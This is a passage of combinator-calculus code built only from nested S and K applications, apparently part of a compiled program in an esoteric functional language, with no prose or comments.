)(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))((K)(K))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))))(((((S)((K)(S)))(K))((S)(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((((((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K)))))))))((K)(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))))(((S)(K))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((